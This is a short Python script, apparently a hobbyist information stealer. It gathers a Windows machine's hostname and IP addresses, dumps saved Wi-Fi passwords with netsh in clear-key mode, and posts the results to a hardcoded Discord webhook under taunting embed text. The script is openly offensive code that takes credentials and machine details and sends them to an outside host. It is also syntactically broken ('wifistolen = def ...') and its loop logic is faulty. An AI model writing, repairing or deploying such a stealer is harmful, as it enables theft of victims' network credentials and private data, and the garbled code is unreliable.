import json
import requests
import time
import socket
import subprocess
computer_name = socket.gethostname()
private_ip = socket.gethostbyname(socket.gethostname())
public_ip = socket.gethostbyname(socket.getfqdn())
token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"

wifistolen = def wifistealer():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print ("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        print ("{:<30}|  {:<}".format(i, ""))
    
    input("")

embed = {
    "title": "BOOM, HEADSHOT!",
    "description": computer_name,
    "color": 16711680,
    "fields": [
        {
            "name": "IP Addresses",
            "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
            "inline": False
        },
        {
            "name": "",
            "value": wifistolen,
            "inline": True
        }
    ],
    "footer": {
        "text": "360 FUCKING NOSCOPED!",
        "icon_url": "https://imgur.com/jWr67J8"
    }
}

payload = {
    "username": "",
    "embeds": [
        embed
    ]
}
headers = {
    "Content-Type": "application/json"
}

# Send the webhook
response = requests.post(token, data=json.dumps(payload), headers=headers)

# Dont fuck with anything below as it will check if this will fucking run

if response.status_code == 204:
    time.sleep(0)
else:
    print(f"Critical Error!: {response.status_code}")
